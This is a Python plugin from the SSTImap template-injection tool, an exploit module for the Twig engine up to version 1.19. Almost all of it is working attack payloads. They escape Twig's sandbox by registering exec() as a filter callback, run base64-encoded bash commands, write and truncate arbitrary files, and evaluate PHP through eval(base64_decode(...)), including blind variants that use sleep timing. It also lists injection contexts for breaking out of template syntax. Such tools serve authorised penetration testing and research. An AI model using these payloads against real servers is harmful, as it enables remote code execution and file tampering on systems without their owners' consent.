from plugins.languages import php
from core import bash
from utils import rand


class Twig_v1(php.Php):
    priority = 5
    plugin_info = {
        "Description": """Twig template engine of versions <=1.19""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://twig.symfony.com/",
            "Github: https://github.com/twigphp/Twig",
        ],
    }

    def init(self):
        # The vulnerable versions <1.20.0 allows to map the getFilter() function
        # to any PHP function, allowing the sandbox escape.
        # Only functions with 1 parameter can be mapped and eval()/assert() functions are not
        # allowed. For this reason, most of the stuff is done by exec() instead of eval()-like code.
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                # {{7*'7'}} and a{#b#}c work in freemarker as well
                # {%% set a=%i*%i %%}{{a}} works in Nunjucks as well
                # "sameas" worked in 1.x but was replaced by "same as" in 2.x
                'test_render': f'{{% if 1 is sameas(1) %}}{{{{(1..3)|join("")}}}}{{% endif %}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
                'test_render_expected': f'123{rand.randstrings[0]}<br />'
            },
            'write': {
                'call': 'inject',
                'write': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'")}}}}""",
                'truncate': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("echo -n >{path}")}}}}"""
            },
            # Hackish way to evaluate PHP code
            'evaluate': {
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'execute': {
                'call': 'render',
                'execute': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'")}}}}""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2] 
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'")}}}}"""
            },
            'evaluate_blind': {
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
        })
        
        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '', 'closures': php.ctx_closures},
            # This escapes string "inter#{"asd"}polation"
            {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
            # This escapes string {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': php.ctx_closures},
        ])
